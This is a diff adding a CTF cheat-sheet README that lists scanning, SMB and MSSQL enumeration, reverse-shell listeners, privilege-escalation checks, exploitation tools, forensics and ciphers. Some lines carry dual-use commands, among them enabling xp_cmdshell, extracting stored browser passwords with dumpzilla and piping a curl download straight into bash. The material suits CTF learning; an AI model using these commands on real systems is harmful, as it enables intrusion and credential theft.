@@ -1,0 +1,1835 @@
+<p align="center">
+  <img src="Introduction/_img/datura.jpg" />
+</p>
+
+DaturaCTF is a database for **ideas** and **tools** to use in CTF competitions. It's purpose is to help the user to find solutions and provide some tools to use when offline.
+
+This database was mostly made from [CTF Katana](https://github.com/JohnHammond/ctf-katana) and [HackTricks](https://book.hacktricks.xyz), but also from tools found along the way. I do not own most of this content, I just gathered it in one place. Credit goes to the original authors, linked in the different sections.
+
+Most of the tools are written in Python and are designed to be used in a Linux environment.
+
+This file is auto generated using [build.py](build.py). To update it, update the README.md files in the subdirectories and run the build.py script.
+
+# Table of Contents
+* [Scanning](#scanning)
+* [Services and Ports](#services-and-ports)
+* [Reverse Shell](#reverse-shell)
+* [Privilege Escalation](#privilege-escalation)
+* [Binary Exploitation](#binary-exploitation)
+* [Classic Exploits](#classic-exploits)
+* [Reverse Engineering](#reverse-engineering)
+* [Forensics](#forensics)
+* [Cryptography](#cryptography)
+* [Web](#web)
+* [Steganography](#steganography)
+* [PDF Files](#pdf-files)
+* [ZIP Files](#zip-files)
+* [Hashes](#hashes)
+* [OSINT](#osint)
+* [Network](#network)
+* [Jail Break](#jail-break)
+* [Android](#android)
+* [Esoteric Languages](#esoteric-languages)
+* [Data Science](#data-science)
+* [Signal processing](#signal-processing)
+* [Chemistry](#chemistry)
+* [Other CheatSheets](#other-cheatsheets)
+
+<br><br>
+
+# Scanning
+
+
+
+
+
+## Website Scanning
+
+
+See [Web Enumeration](#web)
+
+
+## Network Scanning
+
+* [`nmap`](https://nmap.org/)
+
+    `nmap` is a utility for network discovery.
+
+Classic scan
+```	
+nmap -sC -sV -O 192.168.0.0/24
+```
+
+SYN scan : Only send SYN (faster but no service detection)
+```
+nmap -sS 192.168.0.0/24
+```
+
+* [`traceroute`](https://en.wikipedia.org/wiki/Traceroute)
+
+    See the path packets take to reach a host.
+
+## File Scanning
+
+* `file`
+
+    Deduce the file type from the headers.
+
+* `binwalk`
+
+    Look for embedded files in other files.
+
+* `strings`
+
+    Extract strings from a file.
+
+* `grep`
+
+    Search for a string in a file.
+
+
+* `yara`
+
+    Scan a file with Yara rules.
+
+
+<br><br>
+
+# Services and Ports
+
+Assigned port numbers by IANA can be found at [IANA Port Numbers](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml). But other services can also run on these ports.
+
+
+
+
+FTP - File Transfer Protocol - 21/tcp
+-------------------------------------
+
+Transfer files between a client and server.
+The anonymous credentials are anonymous:anonymous.
+
+Connect to a server
+```bash
+ftp <ip> <port>  
+```
+
+Enumerate anonymous logins
+```bash
+nmap -v -p 21 --script=ftp-anon.nse <ip>
+```
+
+
+SSH - Secure Shell - 22/tcp
+---------------------------
+
+Securely connect to a remote server.
+
+Connect to a server
+```bash
+ssh <user>@<ip> -p <port>
+```
+
+Local port forwarding
+```bash
+ssh -L <local_port>:<remote_host>:<remote_port> <user>@<ip> 
+```
+
+Transfer files
+```bash
+scp <file> <user>@<ip>:<path> # Local to remote
+scp <user>@<ip>:<path> <file> # Remote to local
+scp -r <dir> <user>@<ip>:<path> # whole directory
+```
+
+DNS - Domain Name System - 53/tcp
+---------------------------------
+
+DNS is used to resolve domain names to IP addresses.
+
+* [`nslookup`](https://en.wikipedia.org/wiki/Nslookup)
+
+	Query a DNS server for information about a domain name.
+
+* [`dig`](https://en.wikipedia.org/wiki/Dig_(command))
+
+	Query a DNS server for information about a domain name.
+
+HTTP(S) - Hypertext Transfer Protocol - 80/tcp 443/tcp
+------------------------------------------------------
+
+See [Web](#web) for more information.
+
+SMB - Samba - 445/tcp
+---------------------
+
+* [`smbmap`](https://github.com/ShawnDEvans/smbmap)
+
+	`smbmap` tells you permissions and access, which `smbclient` does _not_ do!
+
+	To try and list shares as the anonymous user **DO THIS** (this doesn't always work for some weird reason)
+
+```
+smbmap -H 10.10.10.125 -u anonymous
+```
+
+Or you can attempt just:
+
+```
+smbmap -H 10.10.10.125
+```
+
+And you can specify a domain like so:
+
+```
+smbmap -H 10.10.10.125 -u anonymous -d HTB.LOCAL
+```
+
+Worth trying `localhost` as a domain, if that gets "NO_LOGON_SERVERS"
+
+```
+smbmap -H 10.10.10.125 -u anonymous -d localhost
+```
+
+* `enum4linux`
+
+
+```
+enum4linux 10.10.10.125
+```
+
+* `smbclient`
+
+	**NOTE: DEPENDING ON THE VERSION OF SMBCLIENT YOU ARE USING, you may need to SPECIFY the use of S<B version 1 or SMB version 2. You can dp this with `-m SMB2`. Older versions of SMBclient (latest being 4.10 at the time of writing) use SMB1 _by default_.**
+
+	You can use `smbclient` to look through files shared with SMB. To _list_ available shares:
+
+```
+smbclient -m SMB2 -N -L //10.10.10.125/
+```
+
+Once you find a share you want to/can access, you can connect to shares by using the name following the locator:
+
+```
+smbclient -m SMB2 -N //10.10.10.125/Reports
+```
+
+You will see a `smb: \>` prompt, and you can use `ls` and `get` to retrieve files or even `put` if you need to place files there.
+
+
+SQL - Structured Query Language
+-------------------------------
+
+| Port | Service | Description |
+|------|---------|-------------|
+| 1433 | MSSQL | Microsoft SQL Server |
+| 3306 | MySQL | MySQL Database |
+| 5432 | PostgreSQL | PostgreSQL Database |
+
+
+
+MSSQL - Microsoft SQL Server - 1433/tcp
+---------------------------------------
+
+* `impacket` -> `mssqlclient.py`
+
+	You can connect to a Microsoft SQL Server with `myssqlclient.py` knowing a username and password like so:
+
+```
+mssqlclient.py username@10.10.10.125
+```
+
+It will prompt you for a password. **If your password fails, the server might be using "Windows authentication", which you can use with:**
+
+```
+mssqlclient.py username@10.10.10.125 -windows-auth
+```
+
+If you have access to a Micosoft SQL Server, you can try and `enable_xp_cmdshell` to run commands. With `mssqlclient.py` you can try:
+
+```
+SQL> enable_xp_cmdshell
+```
+
+though, you may not have permission. If that DOES succeed, you can now run commands like:
+
+```
+SQL> xp_cmdshell whoami
+```
+
+SNMP - Simple Network Management Protocol 161/udp 162/udp
+---------------------------------------------------------
+
+* snmp-check
+
+```
+snmp-check 10.10.10.125
+```
+
+
+
+
+
+
+<br><br>
+
+# Reverse Shell
+
+
+
+* [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+
+    Compilation of useful payloads and bypass for Web Application Security and Pentest/CTF.
+
+* [`netcat`](https://en.wikipedia.org/wiki/Netcat)
+
+    A utility for reading from and writing to network connections using TCP or UDP.
+
+Netcat classic listener
+```bash
+$ nc -nlvp 4444
+```
+
+* [`rlwrap`](https://github.com/hanslub42/rlwrap)
+
+    Allows you to use the arrow keys in a reverse shell.
+
+```bash
+$ rlwrap nc -nlvp 4444
+```
+
+* Upgrade a shell to a TTY shell
+
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+<br><br>
+
+# Privilege Escalation
+
+* `sudo`
+
+See what the current user is allowed to do
+```bash
+$ sudo -l
+```
+
+
+* [`PEAS`](https://github.com/carlospolop/PEASS-ng)
+
+    Find common misconfigurations and vulnerabilities in Linux and Windows.
+
+    Some payload can be found in the [Tools](Privilege%20Escalation/Tools/PEAS/) section.
+
+Send linpeas via ssh
+``` bash	
+$ scp linpeas.sh user@domain:/tmp
+```
+
+
+* setuid Files
+
+    Files with the setuid bit set are executed with the permissions of the owner of the file, not the user who started the program. This can be used to escalate privileges.
+
+    [GTFOBins](https://gtfobins.github.io/) has a list of setuid binaries that can be used to escalate privileges.
+
+    Custom setuid files can be exploited using [binary exploitation](#binary-exploitation).
+
+
+Find files with the setuid bit set.
+``` bash
+$ find / -perm -u=s -type f 2>/dev/null
+```
+
+* [CVE-2021-3156](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156)
+
+    sudo versions before **1.9.5p2** are vulnerable to a heap-based buffer overflow. This can be exploited to gain root access. Very useful on older systems.
+
+    Some payload can be found in the [Tools](Privilege%20Escalation/Tools/CVE-2021-3156/) section.
+
+
+<br><br>
+
+# Binary Exploitation
+
+
+
+## ELF
+
+Different types of exploit exists, the most common are:
+
+| Name | Description |
+| ---- | ----------- |
+| [Format String](Binary%20Exploitation/Tools/ELF/6-format_string_vulns/) | Exploits format string functions to read and write in the program memory |
+| [Overwriting stack variables](Binary%20Exploitation/Tools/ELF/1-overwriting_stack_variables/) | Change the value of a variable on the stack. |
+| [ret2win](Binary%20Exploitation/Tools/ELF/3-ret2win_with_params/) | Overwrite the return address to point to an interesting function of the program |
+| [Shellcode](Binary%20Exploitation/Tools/ELF/4-injecting_custom_shellcode/) | Inject shellcode in the program memory and execute it |
+| [ret2libc](Binary%20Exploitation/Tools/ELF/5-return_to_libc/) | Overwrite the return address to point to an intersting function in libc |
+| [Overwriting GOT](Binary%20Exploitation/Tools/ELF/8-overwriting_got/) | Overwrite the address of a function in the GOT to point to an interesting function |
+
+But some security mechanisms exists and can be bypassed:
+
+- ASLR
+Randomization of the memory addresses of the program and the libraries.
+Solution: Leak an adress and calculate the offset between the leaked address and the address of the function you want to call.
+
+- NX
+No execution of the stack.
+
+- Stack canaries
+A random value is stored on the stack and checked before returning from a function.
+Solution: [Leak the canary](Binary%20Exploitation/Tools/ELF/9-bypassing_canaries/) and overwrite it with the correct value.
+
+- PIE
+Randomization of the memory addresses of the program.
+Solution: [Leak an adress](Binary%20Exploitation/Tools/ELF/7-leak_pie_ret2libc/)
+
+* [`checksec`](https://docs.pwntools.com/en/stable/commandline.html)
+
+    A command-line tool that will check the security mechanisms of a binary.
+    
+* [`pwntools`](https://docs.pwntools.com/en/stable/about.html)
+
+    A python library that can be used to interact with a binary.
+
+* [`ROPgadget`](https://pypi.org/project/ROPGadget/)
+
+    A command-line tool that can be used to find gadgets in a binary.
+
+* [`ropper`](https://github.com/sashs/Ropper)
+
+    A command-line tool that can be used to find gadgets in a binary.
+
+## Windows
+
+
+* [`winchecksec`](https://github.com/trailofbits/winchecksec)
+
+	Checks the security features of a Windows binary.
+
+* [`wine`](https://www.winehq.org/)
+
+	Runs Windows programs on Linux.
+
+* [`winedbg`](https://www.winehq.org/)
+
+	Debugger for Windows programs on Linux.
+
+Debug a Windows program on Linux with `winedbg` in gdb mode:
+```bash
+winedbg --gdb <program>
+```
+
+* [`gdb server for wine`](https://www.gnu.org/software/gdb/)
+
+	Remote debugger inside wine. The (very large) package is called `gdb-mingw-w64` on most Linux distributions.
+
+Start a gdb server inside wine: (found at https://stackoverflow.com/questions/39938253/how-to-properly-debug-a-cross-compiled-windows-code-on-linux)
+```bash
+$ wine Z:/usr/share/win64/gdbserver.exe localhost:12345 myprogram.exe
+$ x86_64-w64-mingw32-gdb myprogram.exe
+```
+
+* [Ghidra](https://ghidra-sre.org/)
+
+	Decompiler for binary files, usefull for static analysis.
+	See [Reverse Engineering](#reverse%20engineering) for more info.
+
+* [`Immunity Debugger`](https://www.immunityinc.com/products/debugger/)
+
+	Debugger for Windows programs. I recommend using only GDB in order to learn less commands.
+
+* [`pefile`](https://github.com/erocarrera/pefile)
+
+	Get info about PE files.
+
+* [dnSpy](https://github.com/0xd4d/dnSpy) 
+	
+	.NET debugger and assembly editor.
+
+* [PEiD](https://www.aldeid.com/wiki/PEiD)
+
+	Detects packers, cryptors, compilers, etc.
+
+* jetBrains .NET decompiler
+
+	exists
+
+* [AutoIt](https://www.autoitscript.com/site/autoit/)
+
+	Scripting language for Windows.
+<br><br>
+
+# Classic Exploits
+
+* Heartbleed
+
+	Metasploit module: `auxiliary/scanner/ssl/openssl_heartbleed`
+
+	Be sure to use `set VERBOSE true` to see the retrieved results. This can often contain a flag or some valuable information.
+
+* libssh - SSH
+
+	`libssh0.8.1` (or others??) is vulnerable to an easy and immediate login. Metasploit module: `auxiliary/scanner/ssh/libssh_auth_bypass`. Be sure to `set spawn_pty true` to actually receive a shell! Then `sessions -i 1` to interact with the shell spawned (or whatever appropriate ID)
+
+* Default credentials
+
+    Unconfigured system can use the default credentials to login. Some can be found here: [DefaultCreds-Cheat-Sheet.csv](https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv)
+
+* Log4Shell
+<br><br>
+
+# Reverse Engineering
+
+
+* [ltrace](http://man7.org/linux/man-pages/man1/ltrace.1.html) and [strace](https://strace.io)
+
+	Repport library, system calls and signals.
+
+* [gdb](https://en.wikipedia.org/wiki/GNU_Debugger)
+
+	Most used debugger, can be impoved with [GEF](https://hugsy.github.io/gef/) or [PEDA](https://github.com/longld/peda).
+
+Install GEF on top of gdb:
+```bash
+bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
+```
+
+* [Ghidra](https://ghidra-sre.org/)
+
+	Decompiler for binary files, usefull for static analysis.
+
+Automaticaly create a ghidra project from a binary file:
+```bash
+ghidra.py <file>
+```
+
+* [Hopper](https://www.hopperapp.com)
+
+	Disassembler.
+
+* [Binary Ninja](https://binary.ninja)
+
+	Good for multithreaded analysis.
+
+
+* [IDA](https://www.hex-rays.com/products/ida/support/download.shtml)
+
+	Proprietary reverse engineering software, known to have the best disassembler. The free version can only disassemble 64-bit binaries.
+
+* [radare2](https://github.com/radareorg/radare2)
+
+	Binary analysis, disassembler, debugger.
+
+
+* Compiling & running ASM code:
+
+	You can convert ASM functions from assembly and run them as C functions like the following:
+
+	`asm4.S`
+	```asm
+	.intel_syntax noprefix
+	.global asm4
+	asm4:
+		push   ebp
+		mov    ebp,esp
+		push   ebx
+		sub    esp,0x10
+		mov    DWORD PTR [ebp-0x10],0x27d
+		mov    DWORD PTR [ebp-0xc],0x0
+		jmp    label2
+	label1:
+		add    DWORD PTR [ebp-0xc],0x1
+	label2:
+		mov    edx,DWORD PTR [ebp-0xc]
+		mov    eax,DWORD PTR [ebp+0x8]
+		add    eax,edx
+		movzx  eax,BYTE PTR [eax]
+		test   al,al
+		jne    label1
+		mov    DWORD PTR [ebp-0x8],0x1
+		jmp    label3
+	label4:
+		mov    edx,DWORD PTR [ebp-0x8]
+		mov    eax,DWORD PTR [ebp+0x8]
+		add    eax,edx
+		movzx  eax,BYTE PTR [eax]
+		movsx  edx,al
+		mov    eax,DWORD PTR [ebp-0x8]
+		lea    ecx,[eax-0x1]
+		mov    eax,DWORD PTR [ebp+0x8]
+		add    eax,ecx
+		movzx  eax,BYTE PTR [eax]
+		movsx  eax,al
+		sub    edx,eax
+		mov    eax,edx
+		mov    edx,eax
+		mov    eax,DWORD PTR [ebp-0x10]
+		lea    ebx,[edx+eax*1]
+		mov    eax,DWORD PTR [ebp-0x8]
+		lea    edx,[eax+0x1]
+		mov    eax,DWORD PTR [ebp+0x8]
+		add    eax,edx
+		movzx  eax,BYTE PTR [eax]
+		movsx  edx,al
+		mov    ecx,DWORD PTR [ebp-0x8]
+		mov    eax,DWORD PTR [ebp+0x8]
+		add    eax,ecx
+		movzx  eax,BYTE PTR [eax]
+		movsx  eax,al
+		sub    edx,eax
+		mov    eax,edx
+		add    eax,ebx
+		mov    DWORD PTR [ebp-0x10],eax
+		add    DWORD PTR [ebp-0x8],0x1
+	label3:
+		mov    eax,DWORD PTR [ebp-0xc]
+		sub    eax,0x1
+		cmp    DWORD PTR [ebp-0x8],eax
+		jl     label4
+		mov    eax,DWORD PTR [ebp-0x10]
+		add    esp,0x10
+		pop    ebx
+		pop    ebp
+		ret
+	```
+
+	`asm4.c`
+	```c
+	#include<stdio.h>
+	extern int asm4(char* s);
+
+	int main(){
+	    char *str = "picoCTF_d899a";
+	    printf("%X", asm4(str));
+	    return 0;
+	}
+	```
+	`bash`
+	```bash
+	$ gcc -m32 -o a asm4.c asm4.S
+	$ ./a
+	```
+
+* Punchcards
+
+	[Punch card emulator](http://tyleregeto.com/article/punch-card-emulator)
+
+
+* GameBoy ROMS
+
+	Packages to run GameBoy ROMS: `visualboyadvance` or `retroarch`
+
+
+## Python
+
+
+* [`uncompyle6`](https://github.com/rocky/python-uncompyle6/)
+
+	Decompiles Python bytecode to equivalent Python source code. Support python versions to to 3.8.
+
+	Legend has it that it exists an option (maybe -d) that can suceed when the regular decompilation fails.
+
+* [Decompyle++](https://github.com/zrax/pycdc)
+
+	Less reliable, but claims to decompile every python versions.
+
+* [Easy Python Decompiler](https://sourceforge.net/projects/easypythondecompiler/)
+
+	Windows GUI to decompile python bytecode.
+
+* [Pyinstaller Extractor](https://github.com/extremecoders-re/pyinstxtractor)
+
+	Extracts the python bytecode from pyinstaller windows executables. Can be decomplied  after.
+
+```bash
+python3 pyinstxtractor.py <filename>
+```
+<br><br>
+
+# Forensics
+
+
+* `binwalk`
+
+	A command-line tool to carve files out of another file.
+
+Extract files:
+```bash
+binwalk -e [filename]
+```
+
+* [`yara`](https://virustotal.github.io/yara/)
+
+	Find patterns in files. Rules can be found in the [Yara-Rules](https://github.com/Yara-Rules/rules)
+
+Usage
+```bash
+yara <rules.yar> <file>
+```
+
+
+* [`dumpzilla`](http://www.dumpzilla.org/)
+
+	A [Python](https://www.python.org/) script to examine a `.mozilla` configuration file, to examine downloads, bookmarks, history or bookmarks and registered passwords. Usage may be as such:
+
+```
+python dumpzilla.py .mozilla/firefox/c3a958fk.default/ --Downloads --History --Bookmarks --Passwords
+```
+
+
+* Keepass
+
+	`keepassx` can be installed on Ubuntu to open and explore Keepass databases. Keepass databases master passwords can be cracked with `keepass2john`.
+
+* [Magic Numbers](https://en.wikipedia.org/wiki/Magic_number_(programming)#Magic_numbers_in_files) 
+	The starting values that identify a file format. These are often crucial for programs to properly read a certain file type, so they must be correct. If some files are acting strangely, try verifying their [magic number] with a [trusted list of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures).
+
+* [`hexed.it`](https://hexed.it/)
+
+	An online tool that allows you to modify the hexadecimal and binary values of an uploaded file. This is a good tool for correcting files with a corrupt [magic number]
+
+
+* `foremost`
+
+	A command-line tool to carve files out of another file. Usage is `foremost [filename]` and it will create an `output` directory.
+
+```
+sudo apt install foremost
+```
+
+
+* [`hachoir-subfile`](https://pypi.python.org/pypi/hachoir-subfile/0.5.3)
+
+	A command-line tool to carve out files of another file. Very similar to the other tools like `binwalk` and `foremost`, but always try everything!
+
+
+* [TestDisk](https://www.cgsecurity.org/Download_and_donate.php/testdisk-7.1-WIP.linux26.tar.bz2) 
+	A command-line tool, used to recover deleted files from a file system image. Handy to use if given a `.dd` and `.img` file etc.
+
+* [photorec](https://www.cgsecurity.org/wiki/PhotoRec) 
+	Another command-line utility that comes with `testdisk`. It is file data recovery software designed to recover lost files including video, documents and archives from hard disks, CD-ROMs, and lost pictures (thus the Photo Recovery name) from digital camera memory. PhotoRec ignores the file system and goes after the underlying data, so it will still work even if your media's file system has been severely damaged or reformatted.
+
+
+
+
+## Docker
+
+
+
+## Memory Dump
+
+Memory dumps are captures of the state of the memory at a given time. It contains all the loaded files, processes and data that was used at this moment.
+
+Memory dumps can be analyzed using the [Volatility Framework](https://www.volatilityfoundation.org/)
+
+I recommand using **volatility 3** so you do not have to bother with profiles (finding it was often a pain in vol2)
+
+The documentation can be found [here](https://volatility3.readthedocs.io)
+
+* [Online Cheat Sheet](https://blog.onfvp.com/post/volatility-cheatsheet/)
+
+* [Windows Memory Forensics](https://volatility3.readthedocs.io/en/latest/getting-started-windows-tutorial.html#)
+
+* [Linux Memory Forensics](https://volatility3.readthedocs.io/en/latest/getting-started-linux-tutorial.html)
+
+* Most useful plugins
+
+| Plugin | Description |
+| --- | --- |
+| `pslist` | List all processes |
+| `filescan` | List all files |
+| `filedump` | Dump a file from memory |
+| `netscan` | List all network connections |
+
+* Browser profile
+
+    The browser profile contains a lot of information about the user, such as bookmarks, history, cookies, stored passwords, etc.
+
+In Windows:
+| Browser | Location |
+| --- | --- |
+| Chrome | `C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default` |
+| [Firefox](https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data) | `C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\<profile>` |
+| Edge | `C:\Users\<username>\AppData\Local\Microsoft\Edge\User Data\Default` |
+
+In Linux:
+| Browser | Location |
+| --- | --- |
+| Chrome | `~/.config/google-chrome/Default` |
+| [Firefox](https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data) | `~/.mozilla/firefox/<profile>` |
+
+
+
+
+
+## Disk Image
+
+* [Autopsy](https://www.autopsy.com/download/)
+
+    Browse the filesystem and extract files from a disk image.
+
+* [`mount`]
+
+    Mount a disk image. I recommand to use a virtual machine to mount the disk image. This way you can browse the filesystem and extract files without risking to damage your system.
+
+## Images
+
+
+* `pngcheck`
+
+	Check if a **PNG** file is valid. If it is not, displays the error.
+
+
+* [`pngcsum`](http://www.schaik.com/png/pngcsum/pngcsum-v01.tar.gz)
+
+	Correct the CRCs present in a **PNG** file.
+
+
+* [https://github.com/sherlly/PCRT](https://github.com/sherlly/PCRT)
+
+	Correct a corrupted PNG file.
+
+	Utility to try and correct a **PNG** file. 
+	Need to press enter to show the file.
+
+* Repair image online tool
+
+    Good low-hanging fruit to throw any image at: [https://online.officerecovery.com/pixrecovery/](https://online.officerecovery.com/pixrecovery/)
+
+
+
+* [Analysis Image] ['https://29a.ch/photo-forensics/#forensic-magnifier']
+
+	Forensically is free online tool to analysis image this tool has many features like  Magnifier, Clone Detection, Error Level analysis, Noise Analusis, level Sweep, Meta Data, Geo tags, Thumbnail Analysis , JPEG Analysis, Strings Extraction.
+
+<br><br>
+
+# Cryptography
+
+* [SageMath](https://www.sagemath.org/)
+
+    Powerful mathematics software, very useful for crypto and number theory.
+
+## RSA
+
+[RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)) is an **asymetric** cryptographic algorithm. A **public key** is used to encrypt data and a **private key** is used to decrypt data.
+
+The variables of textbook RSA are:
+- **N**: the product of two large primes
+- **e**: the public exponent
+- **d**: the private exponent
+
+The public key is (N, e) and the private key is (N, d).
+
+### Key generation
+1. Choose two large primes **p** and **q**.
+2. Compute **N = p * q**.
+3. Compute **phi = (p - 1) * (q - 1)**.
+4. Choose an integer **e** such that **1 < e < phi** and **gcd(e, phi) = 1** (usually **e = 65537**).
+5. Compute **d** such that **d * e = 1 mod phi** i.e. **d = e^-1 mod phi**. (for exemple with the [Extended Euclidean algorithm](https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm))
+
+### Encryption
+To encrypt a message **m** with the public key **(N, e)**, compute $c = m^e \mod N$.
+
+c is the ciphertext.
+
+### Decryption
+To decrypt a ciphertext **c** with the private key **(N, d)**, compute $m = c^d \mod N$.
+
+m is the deciphered message.
+
+Several attacks exist on RSA depending on the circumstances.
+
+* [RSA CTF Tool](https://github.com/RsaCtfTool/RsaCtfTool)
+
+    Performs several attacks on RSA keys. Very useful for CTFs.
+
+
+* RSA: Classic RSA
+
+	Variables typically given: `n`, `c`, `e`. _ALWAYS_ try and give to [http://factordb.com](http://factordb.com). If `p` and `q` are able to be determined, use some RSA decryptor; handmade code available here: [https://pastebin.com/ERAMhJ1v](https://pastebin.com/ERAMhJ1v)
+
+__If FactorDB cannot find factors, try [alpertron](https://www.alpertron.com.ar/ECM.HTM)__
+
+* RSA: Multi-prime RSA
+
+	When you see multi-prime RSA, you can use calculate `phi` by still using all the factors.
+
+```
+phi = (a - 1) * (b - 1) * (c - 1)    # ... etcetera
+```
+
+
+* RSA: `e` is 3 (or small)
+
+	If `e` is 3, you can try the cubed-root attack. If you the cubed root of `c`, and if that is smaller than the cubed root of `n`, then your plaintext message `m` is just the cubed root of `c`! Here is [Python](https://www.python.org/) code to take the cubed root:
+
+```
+def root3rd(x):
+    y, y1 = None, 2
+    while y!=y1:
+        y = y1
+        y3 = y**3
+        d = (2*y3+x)
+        y1 = (y*(y3+2*x)+d//2)//d
+    return y
+```
+
+* RSA: Wiener's Little D Attack
+
+	The telltale sign for this kind of challenge is an enormously large `e` value. Typically `e` is either 65537 (0x10001) or `3` (like for a Chinese Remainder Theorem challenge). Some stolen code available here: [https://pastebin.com/VKjYsDqD](https://pastebin.com/VKjYsDqD)
+
+* RSA:  Boneh-Durfee Attack
+	The tellgate sign for this kind of challenge is also an enormously large `e` value (`e` and `n` have similar size).
+Some code for this attack can be found [here](https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage)
+
+* RSA: Chinese Remainder Attack
+
+	These challenges can be spotted when given  mutiple `c` cipher texts and multiple `n` moduli. `e` must be the same number of given `c` and `n` pairs. Some handmade code here: [https://pastebin.com/qypwc6wH](https://pastebin.com/qypwc6wH)
+
+* RSA: Fixed Point
+
+## Simple Codes
+
+* [DCode](https://www.dcode.fr)
+
+	Support many crypto algorithms, but also some interesting tools.
+
+* [CyberChef](https://gchq.github.io/CyberChef/)
+
+	Online tool to encrypt/decrypt, encode/decode, analyse, and perform many other operations on data.
+
+
+* [Keyboard Shift](https://www.dcode.fr/keyboard-shift-cipher)
+
+	ROT but using the keyboard layout.
+
+* Bit Shift
+
+	Characters can be shifted by a fixed number of bits.
+
+
+* DNA Codes
+
+    A DNA sequence can be used to encode a message.
+
+    ![Cryptography/_img/dna_codes.png](Cryptography/_img/dna_codes.png)
+    ![../_img/genome_coding.jpg](Cryptography/_img/genome-coding.jpg)
+
+* XOR
+
+	Simple logic operation that can be used to encrypt a message with a key.
+
+	Encryption: c = m ^ k
+	Decryption: m = c ^ k
+
+* [Caesar Cipher](https://www.dcode.fr/caesar-cipher)
+
+	Shift cipher using the alphabet. Different alphabets can also be used. Vulnerable to frequency analysis.
+
+
+* [Atbash Cipher](https://en.wikipedia.org/wiki/Atbash) 
+	
+	Shift cipher using the alphabet in reverse order. Vulnerable to frequency analysis.
+
+* [Vigenere Cipher](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher) 
+	
+	Shift cipher using a key. The key is repeated to match the length of the message.
+
+	| Type    | Content     |
+    |---------|-------------|
+	| Message | HELLO WORLD |
+	| Key     | ABCDE FABCD |
+	| Cipher (sum)%26  | HFNLP XQEMK |
+
+
+
+* [Gronsfeld Cipher](http://rumkin.com/tools/cipher/gronsfeld.php)
+
+	Variant of the Vigenere cipher using a key of numbers instead of letters.
+
+* [Beaufourt Cipher](https://www.dcode.fr/beaufort-cipher)
+
+
+* [Bacon Cipher](https://en.wikipedia.org/wiki/Bacon%27s_cipher)
+
+	A substitution cipher that replaces each character with five characters from a set of two (A and B is used most of the time). If we look at A as 0 and B as 1 it is a special encoding to binary numbers, where the character A has the value of binary `b00000`. Easy to recognize, because the ciphertext only contains two characters (e.g.: A and B) and the length of the ciphertext is divisible by 5. Example: `AAABB AAABA ABBAB AAABB AABAA AAAAB AAAAA AAABA ABBAB ABBAA`.
+
+        [Online tool](http://rumkin.com/tools/cipher/baconian.php)
+
+* Python random module cracker/predictor
+
+	[https://github.com/tna0y/Python-random-module-cracker](https://github.com/tna0y/Python-random-module-cracker)... helps attack the Mersenne Twister used in Python's random module.
+
+* Transposition Cipher
+
+
+* [LC4](https://www.schneier.com/blog/archives/2018/05/lc4_another_pen.html) 
+	This is an adaptation of RC4... just not. There is an implementation available in Python.
+	[https://github.com/dstein64/LC4/blob/master/documentation.md](https://github.com/dstein64/LC4/blob/master/documentation.md)
+
+* Elgamal
+
+* Affine Cipher
+
+* Substitution Cipher (use quip quip!)
+
+	[https://quipqiup.com/](https://quipqiup.com/)
+
+* Railfence Cipher
+
+	[http://rumkin.com/tools/cipher/railfence.php](http://rumkin.com/tools/cipher/railfence.php)
+
+
+* [Playfair Cipher](https://en.wikipedia.org/wiki/Playfair_cipher) 
+	racker: [http://bionsgadgets.appspot.com/ww_forms/playfair_ph_web_worker3.html](http://bionsgadgets.appspot.com/ww_forms/playfair_ph_web_worker3.html)
+
+* Polybius Square
+
+	[https://www.braingle.com/brainteasers/codes/polybius.php](https://www.braingle.com/brainteasers/codes/polybius.php)
+
+* The Engima
+
+	[http://enigma.louisedade.co.uk/enigma.html](http://enigma.louisedade.co.uk/enigma.html),
+	[https://www.dcode.fr/enigma-machine-cipher](https://www.dcode.fr/enigma-machine-cipher)
+
+
+* Two-Time Pad
+
+* [International Code of Signals Maritime](https://en.wikipedia.org/wiki/International_Code_of_Signals) 
+	First drafted by the British Board of Trade in 1855 and adopted as a world-wide standard on 1 January 1901. It is used for communications with ships, but also occasionally used by geocaching mystery caches (puzzle caches), CTFs and various logic puzzles. You may want to give a look at the tool [maritime flags translator].
+
+
+* Daggers Cipher
+
+The daggers cipher is another silly text-to-image encoder. This is the key, and you can
+find a decoder on [https://www.dcode.fr/daggers-alphabet](https://www.dcode.fr/daggers-alphabet).
+
+![Cryptography/_img/dagger_cipher.png](Cryptography/_img/dagger_cipher.png)
+
+* Hylian Language (Twilight Princess)
+
+The Hylian language is another silly text-to-image encoder. This is the key, and you can
+find a decoder on [https://www.dcode.fr/hylian-language-twilight-princess](https://www.dcode.fr/hylian-language-twilight-princess).
+
+![Cryptography/_img/hylian.png](Cryptography/_img/hylian.png)
+
+* Hylian Language (Breath of the Wild)
+
+The Hylian language is another silly text-to-image encoder. This is the key, and you can
+find a decoder on [https://www.dcode.fr/hylian-language-breath-of-the-wild](https://www.dcode.fr/hylian-language-breath-of-the-wild).
+
+![Cryptography/_img/botw.jpg](Cryptography/_img/botw.jpg)
+
+* Sheikah Language (Breathe of the Wild)
+
+The Sheikah language is another silly text-to-image encoder. This is the key, and you can
+find a decoder on [https://www.dcode.fr/sheikah-language](https://www.dcode.fr/sheikah-language).
+
+![Cryptography/_img/sheikah.png](Cryptography/_img/sheikah.png)
+
+* Hexahue Alphabet 
+
+The hexhue is an another tex-to-image enocder. you can find a decoder
+on [https://www.boxentriq.com/code-breaking/hexahue](https://www.boxentriq.com/code-breaking/hexahue)
+
+![img](Cryptography/_img/hexahue-alphabet.png)
+
+
+* References to DICE, or EFF
+
